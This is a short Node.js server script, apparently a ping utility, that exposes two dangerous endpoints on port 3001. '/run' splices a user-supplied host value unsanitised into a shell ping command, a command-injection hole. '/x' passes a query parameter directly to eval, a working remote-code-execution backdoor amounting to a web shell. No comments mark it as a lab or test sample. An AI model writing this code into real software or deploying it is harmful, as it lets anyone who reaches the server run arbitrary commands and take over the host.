const { exec } = require('child_process');
require('http').createServer((req,res)=>{
  if (req.url.startsWith('/run')) exec('ping -c 1 ' + (new URL(req.url,'http://x').searchParams.get('host')), ()=>{});
  if (req.url.startsWith('/x')) eval((new URL(req.url,'http://x').searchParams.get('q')));
  res.end('ok');
}).listen(3001);